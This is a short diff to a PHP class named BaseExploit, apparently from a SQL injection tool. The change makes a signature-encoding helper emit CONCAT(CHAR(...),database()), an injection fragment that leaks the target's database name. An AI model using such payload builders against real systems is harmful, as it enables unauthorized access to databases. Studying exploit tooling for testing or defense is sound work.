@@ -28,7 +28,7 @@ abstract class BaseExploit
 		$a=array();
 		for ($i=0;$i<strlen($sig);++$i)
 			$a[]=ord($sig[$i]);
-		return "CHAR(".implode(",",$a).")";
+		return "CONCAT(CHAR(".implode(",",$a)."),database())";
 	}
 	protected function signature()
 	{
